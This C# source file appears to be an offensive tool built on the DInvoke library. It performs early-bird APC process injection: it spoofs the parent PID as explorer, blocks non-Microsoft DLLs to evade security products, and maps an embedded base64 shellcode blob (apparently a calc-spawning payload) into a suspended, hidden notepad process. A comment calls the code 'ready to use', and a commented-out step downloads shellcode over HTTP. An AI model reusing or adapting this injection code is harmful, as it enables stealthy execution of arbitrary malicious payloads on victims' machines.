using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Net;
using System.Net.Configuration;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using DInvoke.Data;
using DInvoke.DynamicInvoke;
using Native = DInvoke.Data.Native;
using Win32 = DInvoke.Data.Win32;

namespace Dinvoke
{

    public class SpoofApproach
    {
        [DllImport("kernel32.dll")]
        public static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            ref DInvoke.Data.Win32.WinBase._SECURITY_ATTRIBUTES lpProcessAttributes,
            ref DInvoke.Data.Win32.WinBase._SECURITY_ATTRIBUTES lpThreadAttributes,
            bool bInheritHandles,
            DInvoke.Data.Win32.Advapi32.CREATION_FLAGS dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref Win32.WinNT.ProcessThreadsAPI._STARTUPINFO lpStartupInfo,
            out Win32.WinNT.ProcessThreadsAPI._PROCESS_INFORMATION lpProcessInformation);

        public static bool InitializeProcThreadAttributeList(ref IntPtr lpAttributeList, int dwAttributeCount)
        {
            var lpSize = IntPtr.Zero;
            object[] parameters = { IntPtr.Zero, dwAttributeCount, 0, lpSize };

            // Returns null attributes
            var retVal = (bool)Generic.DynamicAPIInvoke(@"kernel32.dll", @"InitializeProcThreadAttributeList", typeof(DInvoke.DynamicInvoke.Native.InitializeProcThreadAttributeList), ref parameters);
            lpSize = (IntPtr)parameters[3];

            // Returns 2 attributes
            lpAttributeList = Marshal.AllocHGlobal(lpSize);
            parameters = new object[] { lpAttributeList, dwAttributeCount, 0, lpSize };
            retVal = (bool)Generic.DynamicAPIInvoke(@"kernel32.dll", @"InitializeProcThreadAttributeList", typeof(DInvoke.DynamicInvoke.Native.InitializeProcThreadAttributeList), ref parameters);

            return retVal;
        }
        public static bool UpdateProcThreadAttribute(ref IntPtr lpAttributeList, IntPtr attribute, ref IntPtr lpValue)
        {
            object[] parameters = { lpAttributeList, (uint)0, attribute, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero };
            var retVal = (bool)Generic.DynamicAPIInvoke("kernel32.dll", "UpdateProcThreadAttribute", typeof(DInvoke.DynamicInvoke.Native.UpdateProcThreadAttribute), ref parameters);
            return retVal;
        }
        public static void DeleteProcThreadAttributeList(ref IntPtr lpAttributeList)
        {
            object[] parameters = { lpAttributeList };
            Generic.DynamicAPIInvoke("kernel32.dll", "DeleteProcThreadAttributeList", typeof(DInvoke.DynamicInvoke.Native.DeleteProcThreadAttributeList), ref parameters);
        }
        public static uint NtCreateSection(ref IntPtr hSection, uint desiredAccess, IntPtr objectAttributes, ref ulong maxSize, uint sectionPageProtection, uint allocationAttributes, IntPtr hFile)
        {
            object[] parameters = { hSection, desiredAccess, objectAttributes, maxSize, sectionPageProtection, allocationAttributes, hFile };

            var retValue = (uint)Generic.DynamicAPIInvoke(@"ntdll.dll", @"NtCreateSection", typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtCreateSection), ref parameters);

            hSection = (IntPtr)parameters[0];
            maxSize = (ulong)parameters[3];

            return retValue;
        }
        public static bool CreateProcess(string lpApplicationName, string lpCommandLine, uint dwCreationFlags, string lpCurrentDirectory,
            ref Win32.WinNT.ProcessThreadsAPI._STARTUPINFOEX lpStartupInfo, out Win32.WinNT.ProcessThreadsAPI._PROCESS_INFORMATION lpProcessInformation)
        {
            var lpProcessAttributes = new DInvoke.Data.Win32.WinBase._SECURITY_ATTRIBUTES();
            var lpThreadAttributes = new DInvoke.Data.Win32.WinBase._SECURITY_ATTRIBUTES(); ;

            lpProcessAttributes.nLength = (uint)Marshal.SizeOf(lpProcessAttributes);
            lpThreadAttributes.nLength = (uint)Marshal.SizeOf(lpThreadAttributes);

            object[] parameters = { lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, false, dwCreationFlags, IntPtr.Zero, lpCurrentDirectory, lpStartupInfo, null };

            var retVal = (bool)Generic.DynamicAPIInvoke("kernel32.dll", "CreateProcessA", typeof(DInvoke.DynamicInvoke.Native.DELEGATES.CreateProcessA), ref parameters);

            lpProcessInformation = (Win32.WinNT.ProcessThreadsAPI._PROCESS_INFORMATION)parameters[9];
            return retVal;
        }
        public static uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize, IntPtr SectionOffset, ref ulong ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect)
        {
            object[] funcargs = { SectionHandle, ProcessHandle, BaseAddress, ZeroBits, CommitSize, SectionOffset, ViewSize, InheritDisposition, AllocationType, Win32Protect };

            var retValue = (uint)Generic.DynamicAPIInvoke(@"ntdll.dll", @"NtMapViewOfSection", typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtMapViewOfSection), ref funcargs);

            BaseAddress = (IntPtr)funcargs[2];
            ViewSize = (ulong)funcargs[6];

            return retValue;
        }


        static void NotMain(string[] args)
        {
            /// This code is ready to use; make sure you change the pid to that of a running process (notepad.exe, explorer.exe, cmd.exe etc)

            // initialize
            // update
            //create process
            //allocate
            //write
            //protect
            //open thread
            //queue
            //resume

            // InitializeProcThreadAttributeList
            var startupInfoEx = new Win32.WinNT.ProcessThreadsAPI._STARTUPINFOEX();
            startupInfoEx.StartupInfo.cb = (uint)Marshal.SizeOf(startupInfoEx);

            _ = InitializeProcThreadAttributeList(ref startupInfoEx.lpAttributeList, 2);

            // UpdateProcThreadAttribute
            const long BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000;
            const int MITIGATION_POLICY = 0x20007;

            var blockDllPtr = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(blockDllPtr, new IntPtr(BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON));

            _ = UpdateProcThreadAttribute(
                ref startupInfoEx.lpAttributeList,
                (IntPtr)MITIGATION_POLICY,
                ref blockDllPtr);

            // Parent PID Spoofing
            const int PARENT_PROCESS = 0x00020000;

            var ppidPtr = Marshal.AllocHGlobal(IntPtr.Size);
            var hParent = Process.GetProcessesByName("explorer")[0].Handle;
            Marshal.WriteIntPtr(ppidPtr, hParent);

            _ = UpdateProcThreadAttribute(
                ref startupInfoEx.lpAttributeList,
                (IntPtr)PARENT_PROCESS,
                ref ppidPtr);

            // Create Process
            const uint CREATE_SUSPENDED = 0x00000004;
            const uint DETACHED_PROCESS = 0x00000008;
            const uint CREATE_NO_WINDOW = 0x08000000;
            const uint EXTENDED_STARTUP_INFO_PRESENT = 0x00080000;

            var pi = new Win32.WinNT.ProcessThreadsAPI._PROCESS_INFORMATION();
            _ = CreateProcess(
                null,
                "notepad",
                CREATE_SUSPENDED | CREATE_NO_WINDOW | DETACHED_PROCESS | EXTENDED_STARTUP_INFO_PRESENT,
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                ref startupInfoEx,
                out pi);

            //object[] overloadParams =
            //{
            //    null,
            //    "notepad",
            //    CREATE_SUSPENDED | CREATE_NO_WINDOW | DETACHED_PROCESS | EXTENDED_STARTUP_INFO_PRESENT,
            //    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
            //    startupInfoEx,
            //    pi
            //};
            //var pa = new Win32.WinBase._SECURITY_ATTRIBUTES();
            //var ta = new Win32.WinBase._SECURITY_ATTRIBUTES();


            //var parameters = new object[]
            //{
            //    @"C:\Windows\System32\notepad.exe", null, pa, ta, true,
            //    (uint)CREATE_SUSPENDED | CREATE_NO_WINDOW | DETACHED_PROCESS | EXTENDED_STARTUP_INFO_PRESENT, IntPtr.Zero,
            //    @"C:\Windows\System32", startupInfoEx, pi
            //};

            //var moduleDetails = DInvoke.ManualMap.Overload.OverloadModule("C:\\Windows\\System32\\kernel32.dll");
            //Console.WriteLine("[>] Module Base : " + string.Format("{0:X}", moduleDetails.ModuleBase.ToInt64()) + "\n");
            //Console.WriteLine("Decoy module is found!\n Using: {0} as a decoy", moduleDetails.DecoyModule);
            //var hProc = (IntPtr)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "CreateProcessA", typeof(DInvoke.DynamicInvoke.Native.DELEGATES.CreateProcessA), parameters);
            //Call OpenProcess

            Console.WriteLine("CreateProcess");
            Console.WriteLine(" | -> NTSTATUS:     {0}", pi);
            Console.WriteLine(" | -> hParent: {0}", hParent.ToInt64());
            //===============================================================

            // [+] DELETE POINTERS ==================================================================================
            DeleteProcThreadAttributeList(ref startupInfoEx.lpAttributeList);
            Marshal.FreeHGlobal(ppidPtr);
            Marshal.FreeHGlobal(blockDllPtr);

            //[+] NtCreateSection ==================================================================================
            //byte[] shellcodeBytes;
            // using (var client = new HttpClient())
                //{
                //    shellcodeBytes = client.GetByteArrayAsync("http://localhost/msf-calc.bin")
                //        .GetAwaiter().GetResult();
                //}
            var shellcodeRaw =
                    "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA";
            var shellcodeBytes = Convert.FromBase64String(shellcodeRaw);
            const uint GENERIC_ALL = 0x10000000;
            const uint PAGE_EXECUTE_READWRITE = 0x40;
            var hLocalSection = IntPtr.Zero;
            var maxSize = (ulong)shellcodeBytes.Length;

            _ = NtCreateSection(
                ref hLocalSection,
                GENERIC_ALL,
                IntPtr.Zero,
                ref maxSize,
                PAGE_EXECUTE_READWRITE,
                DInvoke.Data.Win32.WinNT.SEC_COMMIT,
                IntPtr.Zero);

            const uint PAGE_READWRITE = 0x04;

            var self = Process.GetCurrentProcess();
            var hLocalBaseAddress = IntPtr.Zero;

            _ = NtMapViewOfSection(
                hLocalSection,
                self.Handle,
                ref hLocalBaseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                ref maxSize,
                2,
                0,
                PAGE_READWRITE);

            // [+] NtMapViewOfSection ==================================================================================
            const uint PAGE_EXECUTE_READ = 0x20;

            var hRemoteBaseAddress = IntPtr.Zero;

            _ = NtMapViewOfSection(
                hLocalSection,
                pi.hProcess,
                ref hRemoteBaseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                ref maxSize,
                2,
                0,
                PAGE_EXECUTE_READ);


            // WRITE MEMORY
            //Marshal.Copy(shellcode, 0, hLocalBaseAddress, shellcode.Length);
            //var buf = Marshal.AllocHGlobal(shellcodeBytes.Length);
            Marshal.Copy(shellcodeBytes, 0, hLocalBaseAddress, shellcodeBytes.Length);

            // QUEUE USER APC

            // Craft an array for the arguments
            object[] funcargs =
            {
                pi.hThread, hRemoteBaseAddress, null, null, null
            };

            DInvoke.Data.Native.NTSTATUS queueStatus = (DInvoke.Data.Native.NTSTATUS)Generic.DynamicAPIInvoke(
                @"ntdll.dll",
                @"NtQueueApcThread", typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtQueueApcThread), ref funcargs);
            Console.WriteLine("NtQueueApcThread");
            Console.WriteLine(" | -> NTSTATUS: {0}", queueStatus);
            Console.WriteLine(" | -> threadHandle: {0}", pi.hThread);
            Console.WriteLine(" | -> baseAddress:   {0}", hRemoteBaseAddress);


            // RESUME THREAD
            object[] resumeArgs =
            {
                pi.hThread, (UInt32)0
            };

            DInvoke.Data.Native.NTSTATUS resumeStatus = (DInvoke.Data.Native.NTSTATUS)Generic.DynamicAPIInvoke(
                @"ntdll.dll",
                @"NtAlertResumeThread", typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtAlertResumeThread),
                ref resumeArgs);
            Console.WriteLine("NtAlertResumeThread");
            Console.WriteLine(" | -> NTSTATUS: {0}", resumeStatus);
            Console.WriteLine(" | -> threadHandle: {0}", pi.hThread);
            //Thread.Sleep(30000);
        }
    }
}